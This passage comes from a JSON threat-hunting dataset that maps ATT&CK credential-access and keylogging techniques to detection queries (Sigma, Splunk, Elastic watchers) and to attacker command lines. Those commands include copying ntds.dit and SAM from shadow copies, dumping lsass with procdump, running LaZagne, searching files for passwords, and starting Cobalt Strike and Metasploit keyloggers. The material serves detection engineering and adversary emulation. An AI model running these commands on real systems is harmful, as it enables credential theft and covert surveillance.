create\\\\\\\\ shadow\\\\\\\\ \\\\\\\\/for\\\\\\\\=C\\\\\\\\: OR copy\\\\\\\\ \\\\\\\\\\\\\\\\?\\\\\\\\\\\\\\\\GLOBALROOT\\\\\\\\\\\\\\\\Device\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\ntds\\\\\\\\\\\\\\\\ntds.dit OR copy\\\\\\\\ \\\\\\\\\\\\\\\\?\\\\\\\\\\\\\\\\GLOBALROOT\\\\\\\\\\\\\\\\Device\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\SAM OR vssadmin\\\\\\\\ delete\\\\\\\\ shadows\\\\\\\\ \\\\\\\\/for\\\\\\\\=C\\\\\\\\: OR reg\\\\\\\\ SAVE\\\\\\\\ HKLM\\\\\\\\\\\\\\\\SYSTEM\\\\\\\\  OR esentutl.exe\\\\\\\\ \\\\\\\\/y\\\\\\\\ \\\\\\\\/vss\\\\\\\\ *\\\\\\\\\\\\\\\\ntds.dit*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(vssadmin.exe\\\\\\\\ Delete\\\\\\\\ Shadows OR vssadmin\\\\\\\\ create\\\\\\\\ shadow\\\\\\\\ \\\\\\\\/for\\\\\\\\=C\\\\\\\\: OR copy\\\\\\\\ \\\\\\\\\\\\\\\\?\\\\\\\\\\\\\\\\GLOBALROOT\\\\\\\\\\\\\\\\Device\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\ntds\\\\\\\\\\\\\\\\ntds.dit OR copy\\\\\\\\ \\\\\\\\\\\\\\\\?\\\\\\\\\\\\\\\\GLOBALROOT\\\\\\\\\\\\\\\\Device\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\config\\\\\\\\\\\\\\\\SAM OR vssadmin\\\\\\\\ delete\\\\\\\\ shadows\\\\\\\\ \\\\\\\\/for\\\\\\\\=C\\\\\\\\: OR reg\\\\\\\\ SAVE\\\\\\\\ HKLM\\\\\\\\\\\\\\\\SYSTEM\\\\\\\\  OR esentutl.exe\\\\\\\\ \\\\\\\\/y\\\\\\\\ \\\\\\\\/vss\\\\\\\\ *\\\\\\\\\\\\\\\\ntds.dit*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Activity Related to NTDS.dit Domain Hash Retrieval\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(vssadmin.exe Delete Shadows vssadmin create shadow \\\\/for=C\\\\: copy \\\\\\\\?\\\\\\\\GLOBALROOT\\\\\\\\Device\\\\\\\\*\\\\\\\\windows\\\\\\\\ntds\\\\\\\\ntds.dit copy \\\\\\\\?\\\\\\\\GLOBALROOT\\\\\\\\Device\\\\\\\\*\\\\\\\\config\\\\\\\\SAM vssadmin delete shadows \\\\/for=C\\\\: reg SAVE HKLM\\\\\\\\SYSTEM  esentutl.exe \\\\/y \\\\/vss *\\\\\\\\ntds.dit*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"vssadmin.exe Delete Shadows\" OR CommandLine=\"vssadmin create shadow /for=C:\" OR CommandLine=\"copy \\\\\\\\?\\\\\\\\GLOBALROOT\\\\\\\\Device\\\\\\\\*\\\\\\\\windows\\\\\\\\ntds\\\\\\\\ntds.dit\" OR CommandLine=\"copy \\\\\\\\?\\\\\\\\GLOBALROOT\\\\\\\\Device\\\\\\\\*\\\\\\\\config\\\\\\\\SAM\" OR CommandLine=\"vssadmin delete shadows /for=C:\" OR CommandLine=\"reg SAVE HKLM\\\\\\\\SYSTEM \" OR CommandLine=\"esentutl.exe /y /vss *\\\\\\\\ntds.dit*\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"vssadmin.exe Delete Shadows\", \"vssadmin create shadow /for=C:\", \"copy \\\\\\\\?\\\\\\\\GLOBALROOT\\\\\\\\Device\\\\\\\\*\\\\\\\\windows\\\\\\\\ntds\\\\\\\\ntds.dit\", \"copy \\\\\\\\?\\\\\\\\GLOBALROOT\\\\\\\\Device\\\\\\\\*\\\\\\\\config\\\\\\\\SAM\", \"vssadmin delete shadows /for=C:\", \"reg SAVE HKLM\\\\\\\\SYSTEM \", \"esentutl.exe /y /vss *\\\\\\\\ntds.dit*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*vssadmin\\\\.exe Delete Shadows|.*vssadmin create shadow /for=C:|.*copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\\\\\.*\\\\windows\\\\ntds\\\\ntds\\\\.dit|.*copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\\\\\.*\\\\config\\\\SAM|.*vssadmin delete shadows /for=C:|.*reg SAVE HKLM\\\\SYSTEM |.*esentutl\\\\.exe /y /vss .*\\\\ntds\\\\.dit.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Transferring files with credential data via network shares\nid: 910ab938-668b-401b-b08c-b596e80fdca5\ndescription: Transferring files with well-known filenames (sensitive files with credential data) using network shares\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        RelativeTargetName|contains:\n            - '\\mimidrv'\n            - '\\lsass'\n            - '\\windows\\minidump\\'\n            - '\\hiberfil'\n            - '\\sqldmpr'\n            - '\\sam'\n            - '\\ntds.dit'\n            - '\\security'\n    condition: selection\nfalsepositives:\n    - Transferring sensitive files for legitimate administration work by legitimate administrator\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Transferring files with credential data via network shares\nid: 910ab938-668b-401b-b08c-b596e80fdca5\ndescription: Transferring files with well-known filenames (sensitive files with credential data) using network shares\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        RelativeTargetName|contains:\n            - '\\mimidrv'\n            - '\\lsass'\n            - '\\windows\\minidump\\'\n            - '\\hiberfil'\n            - '\\sqldmpr'\n            - '\\sam'\n            - '\\ntds.dit'\n            - '\\security'\n    condition: selection\nfalsepositives:\n    - Transferring sensitive files for legitimate administration work by legitimate administrator\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"5145\" AND RelativeTargetName.keyword:(*\\\\\\\\mimidrv* OR *\\\\\\\\lsass* OR *\\\\\\\\windows\\\\\\\\minidump\\\\* OR *\\\\\\\\hiberfil* OR *\\\\\\\\sqldmpr* OR *\\\\\\\\sam* OR *\\\\\\\\ntds.dit* OR *\\\\\\\\security*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Transferring-files-with-credential-data-via-network-shares <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Transferring files with credential data via network shares\",\\n    \"description\": \"Transferring files with well-known filenames (sensitive files with credential data) using network shares\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"5145\\\\\" AND RelativeTargetName.keyword:(*\\\\\\\\\\\\\\\\mimidrv* OR *\\\\\\\\\\\\\\\\lsass* OR *\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\minidump\\\\\\\\* OR *\\\\\\\\\\\\\\\\hiberfil* OR *\\\\\\\\\\\\\\\\sqldmpr* OR *\\\\\\\\\\\\\\\\sam* OR *\\\\\\\\\\\\\\\\ntds.dit* OR *\\\\\\\\\\\\\\\\security*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"5145\\\\\" AND RelativeTargetName.keyword:(*\\\\\\\\\\\\\\\\mimidrv* OR *\\\\\\\\\\\\\\\\lsass* OR *\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\minidump\\\\\\\\* OR *\\\\\\\\\\\\\\\\hiberfil* OR *\\\\\\\\\\\\\\\\sqldmpr* OR *\\\\\\\\\\\\\\\\sam* OR *\\\\\\\\\\\\\\\\ntds.dit* OR *\\\\\\\\\\\\\\\\security*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Transferring files with credential data via network shares\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"5145\" AND RelativeTargetName.keyword:(*\\\\\\\\mimidrv* *\\\\\\\\lsass* *\\\\\\\\windows\\\\\\\\minidump\\\\* *\\\\\\\\hiberfil* *\\\\\\\\sqldmpr* *\\\\\\\\sam* *\\\\\\\\ntds.dit* *\\\\\\\\security*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"5145\" (RelativeTargetName=\"*\\\\\\\\mimidrv*\" OR RelativeTargetName=\"*\\\\\\\\lsass*\" OR RelativeTargetName=\"*\\\\\\\\windows\\\\\\\\minidump\\\\*\" OR RelativeTargetName=\"*\\\\\\\\hiberfil*\" OR RelativeTargetName=\"*\\\\\\\\sqldmpr*\" OR RelativeTargetName=\"*\\\\\\\\sam*\" OR RelativeTargetName=\"*\\\\\\\\ntds.dit*\" OR RelativeTargetName=\"*\\\\\\\\security*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"5145\" RelativeTargetName IN [\"*\\\\\\\\mimidrv*\", \"*\\\\\\\\lsass*\", \"*\\\\\\\\windows\\\\\\\\minidump\\\\*\", \"*\\\\\\\\hiberfil*\", \"*\\\\\\\\sqldmpr*\", \"*\\\\\\\\sam*\", \"*\\\\\\\\ntds.dit*\", \"*\\\\\\\\security*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*5145)(?=.*(?:.*.*\\\\mimidrv.*|.*.*\\\\lsass.*|.*.*\\\\windows\\\\minidump\\\\.*|.*.*\\\\hiberfil.*|.*.*\\\\sqldmpr.*|.*.*\\\\sam.*|.*.*\\\\ntds\\\\.dit.*|.*.*\\\\security.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: obtaining credentials based DCC2\ndescription: windows server 2008 simulation test results\nreferences: https://baijiahao.baidu.com/s?id=1611304657392579351\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0NewProcessname: '* \\ mimikatz.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Tokenpromotiontype: 'TokenElevationTypeFull (2)' # token type lifting\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4673 # privilege has been invoked service.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: '* \\ mimikatz.exe' # Process> Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Privilege: 'SeTcbPrivilege' # service request information> privilege: SeTcbPrivilege\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: SPN service scans honeypot accounts\ndescription: 0day.org simulation test results\nreferences: https://adsecurity.org/?p=3458\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4769 # Kerberos service ticket was requested.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ServiceName: abcc # Service Information> Service Name (honeypot user account)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Clientaddress: :: ffff: * # Network Information> Client Address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Ticketoptions: 0x40810000 # Additional information> ticket information\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Ticketencryptiontype: 0x17 # Additional information> Ticket Encryption Type\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: Use vssown.vbs get NTDS.dit file\ndescription: windows server 2016+ AD domain controller\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0New processname: C: \\ Windows \\ System32 \\ cscript.exe\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Process commandline:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- cscript * .vbs / start # command line based detection\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- cscript * .vbs / create c # command line based detection\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- cscript * .vbs / delete # command line based detection\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- cscript * .vbs / list # command line based detection\n\u00a0\u00a0\u00a0\u00a0condition: selection\n---\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4904 # has been trying to register a security event source.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: C: \\ Windows \\ System32 \\ VSSVC.exe\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Source name: VSSAudit # Event Source\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 8222 # shadow copy has been created.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Process image name: C: \\ Windows \\ System32 \\ wbem \\ WmiPrvSE.exe\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Raw volume: \\\\ \\ Volume {*} \\ # \"*\" represents the regular match?\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Shadow device name: \\\\ \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy * # \"*\" represents the regular match?\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4905 # has been trying to unregister a security event source.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: C: \\ Windows \\ System32 \\ VSSVC.exe\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Source name: VSSAudit # Event Source\n\u00a0\u00a0\u00a0\u00a0timeframe: last 10S # custom time range\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: Use ntdsutil get NTDS.dit file\ndescription: windows server 2008 + AD domain controller\nreferences: https://blog.csdn.net/Fly_hps/article/details/80641987\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ ntdsutil.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: Application log file detection ntdsutil get NTDS.dit\ndescription: windows server 2008 + AD domain controller\nreferences: https://blog.csdn.net/Fly_hps/article/details/80641987\ntags: T1003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: application\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 2005\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: 'lsass (*) * Example shadow copy is starting. This will be a complete shadow copy. * # Represents any number 'value matches\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 2001\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: 'lsass (*) * Shadow copy instance freeze has begun. * # Represents any number 'value matches\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 2003\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: 'lsass (*) * Shadow copy instance freeze stopped. * # Represents any number 'value matches\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 2006\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: 'lsass (*) * Volume Shadow Copy instance completed successfully. * # Represents any number 'value matches\n\u00a0\u00a0\u00a0\u00a0selection5:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 300\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: lsass (*) The database engine is initialized recovery steps. On behalf of any value matches the number # *\n\u00a0\u00a0\u00a0\u00a0selection6:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: triggering a large number of events during the 216 216 #\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: 'lsass (*) detects that the database location changed from: \"C \\ Windows \\ NTDS \\ ntds.dit\" is \"? \\\\ \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy * 1 * \\ Windows \\ NTDS \\ ntds.dit\". * # Represents any number 'value matches\n\u00a0\u00a0\u00a0\u00a0selection7:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 302\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Message: 'lsass (*) The database engine has successfully completed recovery steps. * # Represents any number 'value matches\ntimeframe: last 10S # custom time range\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: plaintext to obtain the voucher --Procdump\ndescription: windows server 2008 simulation test results\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: sysmon\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 1\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Image: '* \\ procdump * .exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Product: ProcDump\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0OriginalFileName: procdump\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CommandLine: 'procdump * .exe -ma lsass.exe * .dmp'\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 10\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0SourceImage: '* \\ procdump * .exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0TargetImage: 'C: \\ Windows \\ system32 \\ lsass.exe'\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "ET ATTACK\\_RESPONSE Windows 64bit procdump Dump File Exfiltration", "product": "Suricata (NSM)", "name": "ET Open Rule"}, {"query": "ET ATTACK\\_RESPONSE Windows 32bit procdump Dump File Exfiltration", "product": "Suricata (NSM)", "name": "ET Open Rule"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell laZagne.exe browsers [-f]", "name": "Cobalt Strike"}, {"source": "atomics/T1081/T1081.yaml", "command": "python2 laZagne.py all\n", "name": null}, {"source": "atomics/T1081/T1081.yaml", "command": "grep -ri password /\n", "name": null}, {"source": "atomics/T1081/T1081.yaml", "command": "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -Pattern password\n", "name": null}, {"source": "atomics/T1081/T1081.yaml", "command": "type C:\\Windows\\Panther\\unattend.xml > nul 2>&1\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml > nul 2>&1\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "grep -riP password #{file_path}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "grep -riP password /", "name": null}], "command_list": ["shell laZagne.exe browsers [-f]", "python2 laZagne.py all\n", "grep -ri password /\n", "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -Pattern password\n", "type C:\\Windows\\Panther\\unattend.xml > nul 2>&1\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml > nul 2>&1\n", "grep -riP password #{file_path}", "grep -riP password /"], "technique_id": "T1081", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1081", "Built-in Windows Command": "", "Cobalt Strike": "", "Description": "https://github.com/hassaanaliw/chromepass\nThis program attempts to collect passwords that Chrome stores.", "Metasploit": ""}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1081", "Built-in Windows Command": "", "Cobalt Strike": "shell laZagne.exe browsers [-f]", "Description": "https://github.com/AlessandroZ/LaZagne (now part of pupy as a post-exploit module)\nThis program attempts to collect passwords from many different data sources related to browsers - it'll get passwords from Firefox, Chrome, Opera, IE.\nthe -f command on the browsers command call is specifically targeting Firefox", "Metasploit": ""}}, {"Atomic Red Team Test - Credentials in Files": {"display_name": "Credentials in Files", "atomic_tests": [{"description": "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n", "supported_platforms": ["macos"], "name": "Extract Browser and System credentials with LaZagne", "executor": {"command": "python2 laZagne.py all\n", "name": "sh"}}, {"description": "Extracting credentials from files\n", "supported_platforms": ["macos", "linux"], "name": "Extract passwords with grep", "input_arguments": {"file_path": {"default": "/", "type": "String", "description": "Path to search"}}, "executor": {"command": "grep -ri password #{file_path}\n", "name": "sh"}}, {"description": "Extracting Credentials from Files\n", "supported_platforms": ["windows"], "name": "Extracting passwords with findstr", "executor": {"elevation_required": false, "command": "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -Pattern password\n", "name": "powershell"}}, {"description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\n", "supported_platforms": ["windows"], "name": "Access unattend.xml", "executor": {"elevation_required": true, "command": "type C:\\Windows\\Panther\\unattend.xml > nul 2>&1\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml > nul 2>&1\n", "name": "command_prompt"}}], "attack_technique": "T1081"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_command_line contains \"*findstr* /si pass*\"or process_command_line contains \"*select-string -Pattern pass*\"or process_command_line contains \"*list vdir*/text:password*\")", "product": "Azure Sentinel", "name": "Credentials In Files"}, {"query": "index=linux sourcetype=linux_audit type=execve a0=grep password", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=\"bash_history\" grep password | table host,user_name,bash_command", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "starting the keylogger:\nkeylogger {x86|x64} {pid}\nwhen you're ready to view logs:\nview -> keylog\nwhen you're done keylogging:\njobs\njobkill {job id number}", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "starting the keylogger:\nkeyscan_start\nwhen you're ready to get the logs:\nkeyscan_dump\nwhen you're done keylogging:\nkeyscan_stop", "name": "Metasploit"}, {"source": "atomics/T1056/T1056.yaml", "command": "Set-Location $PathToAtomicsFolder\n.\\T1056\\src\\Get-Keystrokes.ps1 -LogPath $env:TEMP\\key.log\n", "name": null}, {"source": "Threat Hunting Tables", "command": "powershell.exe Get-Keystrokes -LogPath C:\\key.log", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/USBKeylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/USBKeylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/keylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/keylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/keylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/keylogger", 